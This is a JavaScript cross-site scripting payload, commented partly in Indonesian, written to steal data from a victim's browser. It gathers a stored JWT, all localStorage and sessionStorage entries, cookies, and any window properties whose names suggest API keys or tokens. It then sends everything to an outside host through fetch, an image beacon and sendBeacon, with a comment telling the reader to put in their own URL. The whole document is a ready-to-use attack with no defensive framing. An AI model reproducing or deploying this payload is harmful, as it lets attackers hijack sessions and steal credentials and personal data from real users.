// XSS Payload untuk ekstraksi semua data sensitif
(function() {
  // Kumpulkan semua data
  const data = {
    // JWT Token
    jwt: localStorage.getItem('uxa:jwt') || 'Not found',
    
    // All localStorage
    localStorage: {},
    
    // Session storage
    sessionStorage: {},
    
    // Cookies
    cookies: document.cookie,
    
    // User agent & environment
    userAgent: navigator.userAgent,
    url: window.location.href,
    timestamp: new Date().toISOString(),
    
    // Window properties (mungkin ada API keys)
    windowKeys: Object.keys(window).filter(k => 
      k.includes('key') || k.includes('token') || k.includes('api')
    )
  };
  
  // Extract all localStorage
  for (let i = 0; i < localStorage.length; i++) {
    const key = localStorage.key(i);
    data.localStorage[key] = localStorage.getItem(key);
  }
  
  // Extract sessionStorage
  for (let i = 0; i < sessionStorage.length; i++) {
    const key = sessionStorage.key(i);
    data.sessionStorage[key] = sessionStorage.getItem(key);
  }
  
  // Exfil via multiple methods untuk redundancy
  const exfilUrl = 'https:/testing.aigoretech.cloud'; // Ganti dengan URL Anda
  
  // Method 1: fetch (modern)
  fetch(exfilUrl, {
    method: 'POST',
    mode: 'no-cors',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(data)
  }).catch(e => console.log('Fetch failed, trying backup...'));
  
  // Method 2: Image beacon (backup)
  const img = new Image();
  img.src = `${exfilUrl}?data=${encodeURIComponent(JSON.stringify(data))}`;
  
  // Method 3: If CORS blocks, use navigator.sendBeacon
  if (navigator.sendBeacon) {
    navigator.sendBeacon(exfilUrl, JSON.stringify(data));
  }
  
  // Optional: Tampilkan alert kecil (tapi jangan ganggu UX)
  console.log('[+] Data exfiltrated:', data);
})();